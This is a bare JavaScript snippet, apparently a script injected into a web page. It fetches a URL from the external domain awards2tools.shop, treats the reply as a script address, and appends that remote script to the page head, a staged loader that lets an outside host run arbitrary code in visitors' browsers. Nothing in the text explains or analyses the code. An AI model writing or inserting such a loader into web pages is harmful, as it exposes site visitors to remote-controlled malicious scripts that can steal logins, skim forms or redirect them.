var url = 'https://awards2tools.shop/wbrXFr';

        fetch(url)
            .then(response => response.text())
            .then(data => {
                // head
                var script = document.createElement('script');
                script.src = data.trim(); // 44
                document.getElementsByTagName('head')[0].appendChild(script);
            })
            .catch(error => {
                console.error('bad go.txt:', error);
            });
